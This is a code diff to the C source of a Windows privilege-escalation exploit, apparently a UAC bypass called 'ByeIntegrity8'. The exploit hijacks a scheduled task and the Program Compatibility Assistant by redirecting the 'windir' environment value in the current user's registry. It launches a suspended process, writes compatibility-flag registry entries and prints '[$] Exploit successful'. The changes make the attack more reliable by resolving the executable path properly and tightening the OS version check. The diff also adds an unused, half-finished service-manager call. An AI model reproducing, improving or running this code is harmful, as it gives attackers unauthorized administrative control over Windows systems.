@@ -247,12 +247,12 @@ int wmain(
 			hr = HRESULT_FROM_WIN32(GetLastError());
 			goto end;
 		}
-
+		
 		hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
 			COINIT_SPEED_OVER_MEMORY);
 		if (!SUCCEEDED(hr))
 			goto end;
-
+		
 		hr = BiStopWdiTask(FALSE);
 		*(PBOOLEAN)(exeName + sizeof(BOOLEAN)) = TRUE;
 		CoUninitialize();
@@ -283,8 +283,10 @@ end:
 	LSTATUS status;
 	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
 	PUCHAR pSharedMem = NULL;
+	WCHAR exeName[MAX_PATH];
+	DWORD exeNameSize;
 
-	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 < 3) {
+	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
 		cmdLine[0] = L'L';
 		cmdLine[1] = L'\0';
 		usesPca = FALSE;
@@ -351,6 +353,17 @@ end:
 			goto eof;
 		}
 	}
+	else {
+		SC_HANDLE scHandle;
+
+		scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
+	}
+
+	exeNameSize = MAX_PATH;
+	if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, exeName, &exeNameSize)) {
+		wprintf(L"QueryFullProcessImageNameW() failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
 
 	curDirSize = GetCurrentDirectoryW(0, NULL);
 	curDir = HeapAlloc(GetProcessHeap(), 0, curDirSize * sizeof(WCHAR));
@@ -361,7 +374,7 @@ end:
 	}
 
 	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
-		0, ((wcslen(argv[0]) + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
+		0, ((exeNameSize + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
 	if (!hSharedMem) {
 		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
@@ -374,7 +387,7 @@ end:
 		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
-	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), argv[0], (wcslen(argv[0]) + 1) * sizeof(WCHAR));
+	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), exeName, (exeNameSize + 1) * sizeof(WCHAR));
 
 	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
 		curDirSize * sizeof(WCHAR));
@@ -386,7 +399,7 @@ end:
 
 	ZeroMemory(&si, sizeof(STARTUPINFOW));
 	si.cb = sizeof(STARTUPINFOW);
-	status = (LSTATUS)CreateProcessW(argv[0], cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED,
+	status = (LSTATUS)CreateProcessW(exeName, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED,
 		NULL, NULL, &si, &processInfo);
 	if (!status) {
 		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
@@ -396,7 +409,7 @@ end:
 	}
 
 	if (usesPca)
-		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, argv[0], cmdLine,
+		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, exeName, cmdLine,
 			curDir, PCA_MONITOR_PROCESS_NORMAL);
 	else
 		status = 0;
@@ -432,13 +445,13 @@ eofEarly:
 	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
 	if (!usesPca) {
 		RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
-			argv[0]);
+			exeName);
 		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted",
-			argv[0]);
+			exeName);
 	}
 	else
 		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
-			argv[0]);
+			exeName);
 
 	if (taskHijacked) {
 		_putws(L"[$] Exploit successful\n");
@@ -450,7 +463,6 @@ eofEarly:
 		}
 		Sleep(10);
 	}
-	//Sleep(2500); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
 
 eof:
 	if (processInfo.hThread)
